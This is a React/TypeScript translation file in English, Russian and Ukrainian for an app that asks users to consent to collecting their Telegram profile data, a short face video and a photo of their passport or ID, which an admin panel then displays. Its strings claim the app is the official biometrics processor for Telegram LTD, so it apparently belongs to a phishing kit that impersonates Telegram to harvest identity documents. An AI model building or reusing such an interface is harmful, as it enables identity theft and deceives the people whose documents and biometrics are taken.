import React, { createContext, useState, useContext, useMemo } from 'react';

// Define translations
const resources = {
  en: {
    // Consent Screen
    consentTitle: 'Data Collection Consent',
    consentIntro: 'To continue, please review and agree to our data processing terms. We need to collect some information to verify your identity.',
    consentDataListHeader: 'We will collect the following information:',
    consentDataItem1: 'Your public Telegram profile data.',
    consentDataItem2: 'A short video for age verification.',
    consentDataItem3: 'A photograph of your passport or ID card.',
    consentCheckboxLabel: 'I agree to the processing of my personal data.',
    proceedButton: 'Proceed',
    
    // User Form
    formTitle: 'Identity Verification',
    submitButton: 'Submit Verification Data',
    submittingButton: 'Submitting...',
    submitSuccessTitle: 'Submission Successful!',
    submitSuccessMessage: 'Your data has been submitted for review. Thank you.',
    officialNote: 'This application is the official biometrics processor on behalf of Telegram LTD.',
    
    // Data Collection Steps
    telegramDataTitle: 'Telegram Profile Data',
    telegramDataLoading: 'Loading user data...',
    videoVerificationTitle: 'Video Verification (5s)',
    videoPreviewHint: 'Look into the circle and get ready. The recording will start automatically and last for 5 seconds.',
    cameraError: 'Camera access was denied. Please allow camera permissions to proceed.',
    startRecordingButton: 'Start Verification',
    recordAgainButton: 'Record Again',
    recordingButton: 'Recording...',
    passportUploadTitle: 'Passport/ID Photo',
    capturePhotoButton: 'Capture Photo',
    retakePhotoButton: 'Retake Photo',

    // Admin Panel
    adminTitle: 'Admin Panel - User Submissions',
    adminLoading: 'Loading submissions...',
    adminError: 'Failed to load data',
    adminNoSubmissions: 'No user data has been submitted yet.',
    adminCardSubmitted: 'Submitted',
    adminCardVideoTitle: 'Video Verification',
    adminCardPassportTitle: 'Passport/ID Photo',
    adminCardNoVideo: 'No video.',
    adminCardNoImage: 'No image.',

    // App Header
    userView: 'User View',
    adminView: 'Admin Panel',
  },
  ru: {
    // Consent Screen
    consentTitle: 'Согласие на сбор данных',
    consentIntro: 'Для продолжения, пожалуйста, ознакомьтесь и согласитесь с нашими условиями обработки данных. Нам необходимо собрать некоторую информацию для подтверждения вашей личности.',
    consentDataListHeader: 'Мы будем собирать следующую информацию:',
    consentDataItem1: 'Ваши публичные данные профиля Telegram.',
    consentDataItem2: 'Короткое видео для подтверждения возраста.',
    consentDataItem3: 'Фотографию вашего паспорта или ID-карты.',
    consentCheckboxLabel: 'Я согласен на обработку моих персональных данных.',
    proceedButton: 'Продолжить',

    // User Form
    formTitle: 'Подтверждение личности',
    submitButton: 'Отправить данные на проверку',
    submittingButton: 'Отправка...',
    submitSuccessTitle: 'Отправка успешна!',
    submitSuccessMessage: 'Ваши данные были отправлены на рассмотрение. Спасибо.',
    officialNote: 'Это приложение является официальным обработчиком биометрии со стороны Telegram LTD.',

    // Data Collection Steps
    telegramDataTitle: 'Данные профиля Telegram',
    telegramDataLoading: 'Загрузка данных пользователя...',
    videoVerificationTitle: 'Видео-верификация (5с)',
    videoPreviewHint: 'Смотрите в круг и приготовьтесь. Запись начнется автоматически и продлится 5 секунд.',
    cameraError: 'Доступ к камере запрещен. Пожалуйста, разрешите доступ к камере для продолжения.',
    startRecordingButton: 'Начать верификацию',
    recordAgainButton: 'Записать снова',
    recordingButton: 'Запись...',
    passportUploadTitle: 'Фото паспорта/ID',
    capturePhotoButton: 'Сделать фото',
    retakePhotoButton: 'Переснять',
    
    // Admin Panel
    adminTitle: 'Админ-панель - Заявки',
    adminLoading: 'Загрузка заявок...',
    adminError: 'Ошибка загрузки данных',
    adminNoSubmissions: 'Пока нет отправленных данных от пользователей.',
    adminCardSubmitted: 'Отправлено',
    adminCardVideoTitle: 'Видео-верификация',
    adminCardPassportTitle: 'Фото паспорта/ID',
    adminCardNoVideo: 'Нет видео.',
    adminCardNoImage: 'Нет изображения.',

    // App Header
    userView: 'Форма',
    adminView: 'Админ-панель',
  },
  uk: {
    // Consent Screen
    consentTitle: 'Згода на збір даних',
    consentIntro: 'Для продовження, будь ласка, ознайомтеся та погодьтеся з нашими умовами обробки даних. Нам необхідно зібрати деяку інформацію для підтвердження вашої особи.',
    consentDataListHeader: 'Ми збиратимемо наступну інформацію:',
    consentDataItem1: 'Ваші публічні дані профілю Telegram.',
    consentDataItem2: 'Коротке відео для підтвердження віку.',
    consentDataItem3: 'Фотографію вашого паспорта або ID-картки.',
    consentCheckboxLabel: 'Я згоден на обробку моїх персональних даних.',
    proceedButton: 'Продовжити',

    // User Form
    formTitle: 'Підтвердження особи',
    submitButton: 'Надіслати дані на перевірку',
    submittingButton: 'Надсилання...',
    submitSuccessTitle: 'Відправка успішна!',
    submitSuccessMessage: 'Ваші дані було надіслано на розгляд. Дякуємо.',
    officialNote: 'Цей додаток є офіційним обробником біометрії з боку Telegram LTD.',

    // Data Collection Steps
    telegramDataTitle: 'Дані профілю Telegram',
    telegramDataLoading: 'Завантаження даних користувача...',
    videoVerificationTitle: 'Відео-верифікація (5с)',
    videoPreviewHint: 'Дивіться в коло і приготуйтеся. Запис почнеться автоматично і триватиме 5 секунд.',
    cameraError: 'Доступ до камери заборонено. Будь ласка, надайте дозвіл на використання камери для продовження.',
    startRecordingButton: 'Почати верифікацію',
    recordAgainButton: 'Записати знову',
    recordingButton: 'Запис...',
    passportUploadTitle: 'Фото паспорта/ID',
    capturePhotoButton: 'Зробити фото',
    retakePhotoButton: 'Перефотографувати',
    
    // Admin Panel
    adminTitle: 'Адмін-панель - Заявки',
    adminLoading: 'Завантаження заявок...',
    adminError: 'Помилка завантаження даних',
    adminNoSubmissions: 'Ще немає надісланих даних від користувачів.',
    adminCardSubmitted: 'Надіслано',
    adminCardVideoTitle: 'Відео-верифікація',
    adminCardPassportTitle: 'Фото паспорта/ID',
    adminCardNoVideo: 'Немає відео.',
    adminCardNoImage: 'Немає зображення.',

    // App Header
    userView: 'Форма',
    adminView: 'Адмін-панель',
  }
};

type Language = keyof typeof resources;
type Translations = typeof resources['en'];

interface I18nContextType {
  language: Language;
  setLanguage: (lang: Language) => void;
  t: (key: keyof Translations) => string;
}

const I18nContext = createContext<I18nContextType | undefined>(undefined);

export const I18nProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [language, setLanguage] = useState<Language>('uk');

  const t = useMemo(() => (key: keyof Translations): string => {
    return resources[language][key] || resources['en'][key];
  }, [language]);

  // FIX: Replaced JSX with React.createElement to prevent parsing errors in a .ts file.
  return React.createElement(
    I18nContext.Provider,
    { value: { language, setLanguage, t } },
    children
  );
};

export const useTranslation = () => {
  const context = useContext(I18nContext);
  if (context === undefined) {
    throw new Error('useTranslation must be used within an I18nProvider');
  }
  return context;
};

export const availableLanguages = Object.keys(resources) as Language[];